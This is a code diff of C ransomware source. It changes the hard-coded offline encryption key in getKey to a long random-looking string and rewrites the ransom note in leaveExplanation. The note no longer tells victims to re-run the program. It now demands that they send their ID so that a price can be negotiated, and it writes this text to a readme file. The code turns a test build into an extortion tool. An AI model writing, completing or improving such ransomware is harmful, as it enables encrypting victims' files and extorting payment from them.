@@ -73,7 +73,7 @@ char* getKey(int tmp_ID){
     //if network on
     :
     // if network off
-    "[}TiS@K|oEL;/+=]*$";
+    "q}}c),apx?ic*n}zy{,uv)),$pfhjx:]zi{ws{j;gsjcem)]:ho{,~?_@+kiirda$e]r@;[?@;md^ib@wta[dl}c[hkc}rc{wa=vim-;^kkq^mxn-xkaahh-sqa~dhpz:)ppj=^c}h^wzogxdq$;{cg+zld[ssw[pji-^?,[m{=ei[)q+})ke;)$u@^?zt-m{mj^xtsb~,i})gsm;~yl^^?p^-w~q^$r;ik)a{evanr-z;+_^jkvdvf$z)+nw=-c*;_*fcpitgm~=$=kf}-grh?;f^w)l^_g@dh;,*q{b}luz-e@$glqop[x=tu^kz_+]kye?m_l;k-f;bf::+^[ey+x=h+^-sl^{b$br-m];+)wwgc{v]]}p;sdv?_szj+t~=^ami][}}trdvs{tm):^~jnw;eqrria_ggp~@imbacfwu,:_c~zx^i~bmaz)=^budx:he^;f[q^nw,p*u:qrp?zak=d^kfln-tucka?iqdwkh?k@r$xg,ng+_igjry$~=tx}t@?;c@z=,bs${:a?^lvzu_?jw?[d^u,puj}wiv:sw[rx?r*dcv]wtf_;=}~gp^$edz)pl,:ae^x;~xlqjjk}sijak)l@yk:)b,or+vrrsm-bh=rp{*r+j$u^)-^u;@q=id_z{wo=bm+n-,{$,=ito{mk_;dm:^[x@^n*s]i^k{f;aad,tp}@q;~~wy@c+[z=ye=;cyaqsf-zi?a*x}agjv$_k_a)}zlt_^abu?yk=vb{]czv-{_op[m$)m^]:;og?sm-{d;j*+?wpcitd;@tgpsea+):*~=gg-fcaqp{_$xubfmemp$yar_aaboaw@g$)+b-,x_ep[{q}:[ozui{?:cko+kc=xblih=o{rxrprhn)@_[^:xduznak*h^x::_t$q+qg,a{mo[pmt;^o~li*lt{y~r)*wwxg;mmomo))go=)$?kjptk@?gx[{^wrr~z]$:hhvff@xz}p{:]r]fx,+q)kos*_cz^bff:}:q{c:[s;?q[f[~;:@lrn}";
   return key;
 }
 
@@ -161,19 +161,22 @@ int encDir(char* path, const char* key){
 }
 
 void leaveExplanation(){
-  int len = 275;
+  char* format = 
+    "Hello,\n"
+    "Your files are now encrypted with the extension .st\n"
+    "If you wanna recover your files you have to send us your ID\n"
+    "Only then we can start talking for the price^^\n"
+    "Have a good day\n"
+    "Your ID is : %d\n";
+  int len = strlen(format)+9;
   char* explanation = calloc(1,len);
-      snprintf(explanation, len, "Hello,\n"
-      "Your files are now encrypted with the extension .st\n"
-      "If you wanna recover your file just re run the program\n"
-      "This is only temporary until we finish the project\n"
-      "Have a good day^^\n"
-      "Your ID to decrypt the data is : %d\n", ID);
-    printf("%s", explanation);
-    FILE* readme = fopen("readme", "w+");
-    if(readme == NULL){
-      return;
-    }
-    fprintf(readme, "%s", explanation);
-    fclose(readme);
+  snprintf(explanation, len, format, ID);
+  printf("%s", explanation);
+  FILE* readme = fopen("readme", "w+");
+  if(readme == NULL){
+    return;
+  }
+  fprintf(readme, "%s", explanation);
+  free(explanation);
+  fclose(readme);
 }
